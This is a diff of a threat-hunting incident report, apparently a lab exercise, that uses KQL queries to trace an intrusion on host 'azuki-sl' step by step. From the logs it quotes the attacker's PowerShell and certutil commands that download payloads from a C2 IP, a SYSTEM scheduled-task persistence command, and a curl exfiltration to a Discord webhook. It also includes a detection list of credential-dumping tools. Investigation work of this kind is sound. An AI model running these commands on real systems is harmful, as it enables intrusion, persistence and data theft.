@@ -195,6 +195,178 @@ DeviceNetworkEvents
 | where RemoteIPType == "Public" or "IsExternal" == true
 | where InitiatingProcessCommandLine contains "powershell.exe"
 ```
-**Results: C2 IP: 78.141.196.6
+**Results:** C2 IP: 78.141.196.6
 
 <img width="1140" height="500" alt="image" src="https://github.com/user-attachments/assets/51ad81a0-fe57-4eb3-974c-c07d47cf1dfa" />
+**Query 3 - Internal Reconnaissance:**
+```sql
+DeviceProcessEvents
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where DeviceName == "azuki-sl"
+| where AccountName == "kenji.sato"
+| where ProcessCommandLine has_any ("powershell", "ipconfig", "route", "Get", "net", "arp", "systeminfo")
+| project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine
+| order by Timestamp desc
+```
+Results:
+<img width="1157" height="665" alt="image" src="https://github.com/user-attachments/assets/271eb6be-ec21-4022-b306-4da20cb26f1b" />
+**Query 4 - Malicious PowerShell Execution:**
+```sql
+DeviceFileEvents
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where DeviceName == "azuki-sl"
+| where InitiatingProcessCommandLine contains "invoke"
+| order by Timestamp asc 
+```
+**Results:**
+```sql
+powershell  -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"
+```
+<img width="1080" height="632" alt="image" src="https://github.com/user-attachments/assets/9bb5514a-f9ee-40e5-9aa7-51eb12bb34d8" />
+
+**Query 5 - Staging Directory Created**
+```sql
+DeviceFileEvents
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
+| where DeviceName == "azuki-sl"
+| where InitiatingProcessAccountName == "kenji.sato"
+| where FolderPath has_any ("temp", "Appdata", "tmp", "Programdata", "zip")
+| where InitiatingProcessCommandLine has_any ("powershell", "cmd", "ps1")
+| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessVersionInfoOriginalFileName
+| order by Timestamp desc 
+```
+**Results:**
+```sql
+"powershell.exe" -ExecutionPolicy Bypass -File C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1
+```
+<img width="1183" height="672" alt="image" src="https://github.com/user-attachments/assets/d1e5f78c-31d5-47b3-bf30-c12d0328ae90" />
+
+**Query 6 - Malware Downloaded via CertUtil (Defense Evasion):**
+```sql
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where ProcessCommandLine has_any ("msedge", "Atbroker", "AppInstaller", "Certutil")
+```
+**Results:**
+```sql
+ “"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe”
+```
+<img width="1209" height="531" alt="image" src="https://github.com/user-attachments/assets/a5feae11-c7ea-4680-aac3-0adf0e7a327b" />
+
+**Query 7 - Persistence Established:**
+```sql
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where ProcessCommandLine has_any ("schtasks")
+```
+Results: Timestamp 2025-11-19T19:07:46.9796512Z: “Windows Update Check” was created in  the C:\ProgramData\WindowsCache folder which is an unusual location for update tasks.
+<img width="1107" height="548" alt="image" src="https://github.com/user-attachments/assets/caff0155-0f28-42ed-8721-f385939adeec" />
+<img width="1178" height="737" alt="image" src="https://github.com/user-attachments/assets/5c37f092-92e2-4003-9b72-3568ccc94deb" />
+The path to an executable is included in the scheduled task:
+
+"schtasks.exe" /create /tn "Windows Update Check" /tr **C:\ProgramData\WindowsCache\svchost.exe** /sc daily /st 02:00 /ru SYSTEM /f
+**Query 8 - Credential Dumping:
+```sql
+// Detect potential credential dumping tool filenames
+DeviceProcessEvents
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where DeviceName == "azuki-sl"
+| extend n = tolower(FileName), cmd = tolower(ProcessCommandLine), path = tolower(FolderPath)
+// Keyword-based detection for credential dumping tools
+| where n has_any (
+        "mimikatz",          // well-known credential dumper
+        "wdigest",
+        "lsass",
+        "nanodump",          // stealthy LSASS dump
+        "procdump",
+        "dumpert",
+        "outflank",
+        "invoke-mimikatz",
+        "sekurlsa",
+        "handlekatz",
+        "keethief",
+        "safetykatz",
+        "cred",              // broad pattern
+        "dump"               // broad pattern
+    )
+// OR suspicious command-line usage typically tied to LSASS access
+    or cmd has_any ("lsass", "sekurlsa", "wdigest", "procdump", "nanodump")
+    or path has @"\temp\" or path has @"\programdata\"    // common drop locations
+// Only keep executable-like files
+| where n matches regex @"\.(exe|dll|bin|ps1|bat|cmd)$"
+// Summarize by filename and machine
+| summarize
+      FirstSeen=min(Timestamp),
+      LastSeen=max(Timestamp),
+      Count=dcount(DeviceName),
+      Devices=make_set(DeviceName, 20)
+    by FileName, FolderPath, SHA256
+| order by LastSeen desc
+
+ ```
+**Results:** Timeline 2025-11-19T19:08:26.2804285Z: File “mm.exe” was created on the “azuki-sl” device.
+<img width="1122" height="643" alt="image" src="https://github.com/user-attachments/assets/4404e563-2a1f-4e54-9399-6475762c5420" />
+
+**Query 9 - Data Collection:**
+```sql
+DeviceFileEvents
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where ActionType == "FileCreated"
+| where FolderPath contains @"C:\ProgramData\WindowsCache"
+| where FileName contains "zip"
+| order by Timestamp desc
+```
+**Results:** Timestamp **2025-11-19T17:19:19.2066001Z**: “export-data ” file was created.
+
+Timestamp **2025-11-19T19:08:58.0244963Z**: another  “export-data ” file was created.
+<img width="1092" height="667" alt="image" src="https://github.com/user-attachments/assets/a6137b03-28e1-4456-980b-f7d8e0f82563" />
+
+**Query 10 - Exfiltration via Discord Webhook**
+```sql
+DeviceNetworkEvents
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where DeviceName == "azuki-sl"
+| where InitiatingProcessAccountName == "kenji.sato"
+| where ActionType == "ConnectionSuccess"
+| where RemoteIPType == "Public" 
+| join kind =inner  DeviceFileEvents on InitiatingProcessAccountName
+| where FileName endswith ".zip"
+```
+**Results:**
+
+Timeline **2025-11-19T19:09:21.4234133Z**: “export-data” file ws uploaded using discord service using the following command:
+```sql
+"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8
+```
+**Query 11 - Lateral Movement Attempt:**
+```sql
+DeviceNetworkEvents
+| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+| where DeviceName == "azuki-sl"
+| where ActionType == "ConnectionSuccess" and  RemoteIPType == "Private"
+| where InitiatingProcessCommandLine has_any ("cmdkey", "mstsc")
+```
+**Results:**
+
+Timestamp **2025-11-19T19:10:42.057693Z**: Successful RDP connection to host 10.1.0.188.
+<img width="708" height="776" alt="image" src="https://github.com/user-attachments/assets/817e66c5-cafa-4694-b02f-b655bf9fd488" />
+
+### **E. Supporting Evidence**
+
+~~☐~~ All screenshots attached
+
+~~☐~~ Full query results attached
+
+~~☐~~ Network logs reviewed
+
+~~☐~~ File hashes documented
+
+---
+
+**Report Completed By:** Andre Poyser
+
+**Date:** **26-November-2025**
+
+**Reviewed By:** ________________
+
+
